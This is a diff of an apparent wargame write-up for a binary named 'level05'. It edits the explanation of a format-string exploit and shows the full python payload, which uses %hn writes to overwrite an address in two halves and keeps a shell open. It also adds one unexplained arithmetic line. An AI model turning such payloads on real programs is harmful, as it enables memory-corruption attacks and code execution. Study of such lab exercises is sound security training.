@@ -101,11 +101,11 @@ Second write (high 16 bits)
 65535 - 55408 = 10127
 ```
 
-Due to minor runtime differences, the working value was adjusted slightly:
+Due to minor runtime differences, the working value was adjusted slightly with 8 bytes:
 ```
 10119
 ```
-
+10119 + 55408 
 This is normal in format string exploitation and does not change the logic.
 
 ## 7. Final payload
@@ -113,7 +113,6 @@ This is normal in format string exploitation and does not change the logic.
 ```bash
 (python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55408c"+"%10$hn"+"%10119c"+"%11$hn"' ; cat -) | ./level05
 ```
-
 - The addresses are placed first so %10$hn and %11$hn reference them.
 
 - %55408c prints enough characters to reach 0xd865.
